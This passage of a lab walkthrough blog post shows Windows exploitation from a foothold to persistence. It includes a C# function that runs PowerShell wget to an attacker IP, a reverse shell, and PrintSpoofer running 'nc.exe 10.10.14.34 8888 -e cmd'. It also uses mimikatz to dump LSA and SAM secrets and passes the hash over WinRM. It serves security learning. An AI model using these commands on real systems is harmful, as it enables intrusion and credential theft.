</span></span><span style="display:flex;"><span>  }</span></span></code></pre></div>
    
</div>
</li>
<li>This function named <code>xml()</code> is designed to execute the <code>calc.exe</code> program:
<ul>
<li><strong>Command Line Args</strong>: <code>string cmd = &quot;wget http://10.10.14.34/POC&quot;;</code> this is the IP of my host as well as a fake dir <code>POC</code> that I want it to try to connect to.</li>
<li><strong>Process creation</strong>: Uses the <code>System.Diagnostics.Process</code> class to launch an external process (<code>calc.exe</code>).</li>
<li><strong>Define the process to launch</strong>: <code>proc.StartInfo.FileName = &quot;powershell.exe&quot;</code> defines PowerShell as the process to launch.</li>
<li><strong>Shell behavior</strong>: <code>UseShellExecute = false</code> ensures that the process doesn&rsquo;t require a shell to run.</li>
<li><strong>Redirect Output</strong>: <code>RedirectStandardOutput = true</code> captures the output (useful to redirect to us)
<strong>Return Output</strong>: <code>return output;</code> The function finally returns the process output.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Run the exploit &amp; get a hit</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-084311_.png">
</figure>
</li>
<li>This proves it works as I get a connection.</li>
</ul>
</li>
</ul>
<h4 id="base64-encoded-powershell-string">Base64 Encoded PowerShell String:</h4>
<p>So as we have a connection we want to create a payload that we can trigger back to ourselves:</p>
<ul>
<li>
<p>I navigate to <a href="https://www.revshells.com/">https://www.revshells.com/</a> and use the <code>PowerShell #3 (Base64)</code> option and generate a reverse shell back to myself.</p>
</li>
<li>
<p>I then place this in my script:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-085946_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Start my listener &amp; trigger it &amp; Success!!!!</strong></p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-085722_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h2 id="3-dot-privesc">3. Privesc:</h2>
<ul>
<li>
<p>Now we have a reverse-shell lets get to work</p>
</li>
<li>
<p>Immediately looking at the User&rsquo;s Privilege we have the &ldquo;<code>SeImpersonatePrivilege</code>&rdquo; which means potato exploits or printer exploits could be on the cards.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-090638_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="seimpersonateprivilege-explained">SeImpersonatePrivilege Explained:</h3>
<ul>
<li>
<p><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">Potato Exploits</a> take advantage of these privileges.</p>
</li>
<li>
<p>A security privilege in Windows that allows a process to adopt the security context of another user, typically after that user has been authenticated.</p>
</li>
<li>
<p>Essential for scenarios where a service (like SQL Server or IIS) needs to perform operations on behalf of an authenticated user, particularly when accessing resources that require user-specific permissions.</p>
</li>
<li>
<p><strong>Impersonation with</strong> <code>SeImpersonatePrivilege</code>:</p>
<ul>
<li><strong>Process Tokens Overview</strong>:
<ul>
<li>Every process has an associated token that represents the identity and privileges of the account that initiated the process.</li>
<li>The token contains security information like user identity, group memberships, and associated privileges.</li>
<li>This token is automatically assigned when the process starts, based on the account under which the process is running (e.g., a system account or a user account).</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Impersonation Using</strong> <code>SeImpersonatePrivilege</code>:</p>
<ul>
<li>When a service impersonates a user, it temporarily uses the user&rsquo;s token to perform actions with the user&rsquo;s permissions.
<ul>
<li>The service can access resources (like file shares) that the user is allowed to access.</li>
<li>The privilege allows the process running the service to &ldquo;borrow&rdquo; the identity of another user securely.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Summarized</strong>: The token of each process defines what that process can do, based on the permissions of the account running it. <code>SeImpersonatePrivilege</code> allows services to use another user&rsquo;s token for performing tasks on their behalf.</p>
</li>
<li>
<p><strong>Usage Context</strong>:</p>
<ul>
<li>In the context of SQL Server or IIS using Windows Authentication, <code>SeImpersonatePrivilege</code> enables these services to perform tasks under the security context of the connected user, ensuring that operations adhere to the principle of least privilege and respect user-specific access controls.</li>
</ul>
</li>
</ul>
<h5 id="example-of-impersonate-privilege-working">Example of Impersonate Privilege Working:</h5>
<ul>
<li>
<p><strong>How Impersonation Works</strong>:</p>
<ul>
<li>The client connects to the service using their credentials (via Windows Authentication).</li>
<li>The service, upon needing to access other resources (like file shares), uses the client&rsquo;s identity instead of its own.</li>
<li>This is possible because the service account is given a special privilege called &ldquo;Impersonate a client after authentication&rdquo;.</li>
</ul>
</li>
<li>
<p><strong>Simple Text-Based Diagram of Impersonation Mechanism Working</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="[Client]%0a%20%20%20%20%7c%0a%20%20%20%20%7c%20%281%29%20Authenticates%20using%20Windows%20Auth%0a%20%20%20%20v%0a[Server%20%28SQL/IIS%29]%0a%20%20%20%20%7c%0a%20%20%20%20%7c%20%282%29%20Needs%20to%20access%20other%20resources%0a%20%20%20%20v%0a[Impersonation%20Process]%0a%20%20%20%20%7c%0a%20%20%20%20%7c%20%283%29%20Server%20adopts%20the%20client%27s%20identity%0a%20%20%20%20v%0a[Other%20Resources]%0a%20%20%28e.g.,%20File%20Shares%29">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>[Client]
</span></span><span style="display:flex;"><span>    |
</span></span><span style="display:flex;"><span>    | (1) Authenticates using Windows Auth
</span></span><span style="display:flex;"><span>    v
</span></span><span style="display:flex;"><span>[Server (SQL/IIS)]
</span></span><span style="display:flex;"><span>    |
</span></span><span style="display:flex;"><span>    | (2) Needs to access other resources
</span></span><span style="display:flex;"><span>    v
</span></span><span style="display:flex;"><span>[Impersonation Process]
</span></span><span style="display:flex;"><span>    |
</span></span><span style="display:flex;"><span>    | (3) Server adopts the client&#39;s identity
</span></span><span style="display:flex;"><span>    v
</span></span><span style="display:flex;"><span>[Other Resources]
</span></span><span style="display:flex;"><span>  (e.g., File Shares)</span></span></code></pre></div>
    
</div>
<ol>
<li><strong>Client to Server Authentication</strong>: The client authenticates to the server using Windows authentication.</li>
<li><strong>Resource Request</strong>: The server requires access to additional resources (like files).</li>
<li><strong>Impersonation</strong>: The server impersonates the client&rsquo;s identity to gain the same permissions the client has.</li>
<li><strong>Access Resources</strong>: The server, acting as the client, accesses external resources (file shares, etc.).</li>
</ol>
</li>
</ul>
<h2 id="4-dot-ownership">4. Ownership:</h2>
<ol>
<li>
<p><strong>I upload the PrintSpoofer exploit binary</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-101932_.png">
</figure>
</li>
<li><strong>Source</strong>: <a href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a></li>
</ul>
</li>
<li>
<p><strong>I upload my nc.exe binary</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-101812_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I run the exploit</strong>:</p>
<ul>
<li><code>.\printspoofer.exe -c &quot;C:\Users\Public\Desktop\nc.exe 10.10.14.34 8888 -e cmd&quot;</code>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-102008_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Shell Caught!</strong></p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-102036_.png">
</figure>
</li>
</ul>
</li>
</ol>
<h2 id="5-dot-persistence">5. Persistence:</h2>
<ul>
<li>
<p><strong>Now that we have access we want ensure we can retain it</strong>:</p>
</li>
<li>
<p><strong>I transfer mimikatz to the box</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-112109_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I try and &amp; dump LSASS &amp; Kerberos tickets but it appears the LSASS process is protected which is standard on more updated systems</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-122444_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I dump the LSA (Local System Authorited secrets) secrets</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-113900_.png">
</figure>
</li>
<li>I find a Default weak Password for accounts:</li>
</ul>
</li>
<li>
<p><strong>I also dump the SAM secrets</strong>:</p>
<ul>
<li>I get the <code>Administrator</code> Hash and Kerberoros information for <code>REMOTEAdministrator</code></li>
<li><figure><img src="/ox-hugo/2024-09-09-114202_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I verify the Administrator hash works using netexec</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-114403_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>As Win-Rm is running 5985,5986 I verify I can re-login using the Admin hash using a PTH (pass the hash attack)</strong></p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-09-114538_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>We now have persistence.</p>
</li>
</ul>
<h2 id="lessons-learned">Lessons Learned:</h2>
<h3 id="what-did-i-learn">What did I learn?</h3>
<ol>
<li>I learned more about <code>C#</code> and creating a reverse shell via xml.</li>
<li>I actually learned more about mimikatz (I just use the tool but I never actually sit and think about what is going on under the hood. I finally did and will expanding my notes &amp; sharing them.</li>
</ol>
<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
<ol>
<li>I spent 10 mins resetting the host as I was using the wrong username, this is why I usually always work from vars, but didn&rsquo;t decided to manually type it in!!!</li>
<li>Oh for some reason I used the wrong IP to connect back to myself on, triple check!!!</li>
</ol>
<h2 id="sign-off">Sign off:</h2>
<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
<p>Until next time, hack the planet!</p>
<p>– Bloodstiller</p>
<p>– Get in touch bloodstiller at proton dot me</p>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved ®.</li>
            

            
                <li>Bloodstiller</li>
            

            
                
            
                
            
                
                    <li>
                        
                            <a href="https://github.com/bloodstiller" target="_blank">
                                <i class="bi-github"></i>
                            </a>
                        

                    </li>
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        2694
                    
                </li>
            


            
                <li>en</li>
            

            

            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Sep 09 2024 00:00:00
                        </time>
                    
                </li>
            

            
        </ul>
    </div>
</footer>

    </body>

    






















    
        
        <script
            type="text/javascript"
            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
    















<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
